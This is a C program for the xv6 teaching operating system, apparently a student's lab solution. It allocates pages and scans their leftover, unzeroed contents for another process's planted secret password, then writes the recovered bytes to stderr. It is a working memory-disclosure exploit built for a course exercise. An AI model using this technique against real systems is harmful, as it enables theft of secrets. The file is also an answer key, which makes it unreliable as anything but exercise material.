#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define PGNUM 32
#define PROMPTLEN 31

int
main(int argc, char *argv[])
{
  char *end = sbrk(PGSIZE * PGNUM);
  const char* prompt = "my very very very secret pw is:";
  
  for(int i = 0; i < PGNUM; i++){
    int match_count = 0;
    for(int j = 0; j < PROMPTLEN; j++) {
      if(end[i * PGSIZE + j] == prompt[j]) {
        match_count++;
      }
    }

    // Must use fuzzy search; too accurate will fail
    // because of memory contamination?
    if(match_count >= 23) {
      // debug
      // the reason why fuzzy search is
      // 8 byte pointer allocate when free a page.
      printf("Found at page %d, matches: %d/31\n", i, match_count);
      printf("Pattern: ");
      
      char output[32];
      for(int k = 0; k < 32; k++) {
        char ch = end[i * PGSIZE + k];
        if(ch >= 32 && ch <= 126) {
          output[k] = ch;
        } else {
          output[k] = '.';  // substitution of unprintable char
        }
      }
      output[31] = '\0';
      printf("%s\n", output);

      write(2, end + i * PGSIZE + 32, 8);
      exit(0);
    }
  }
  exit(1);
}
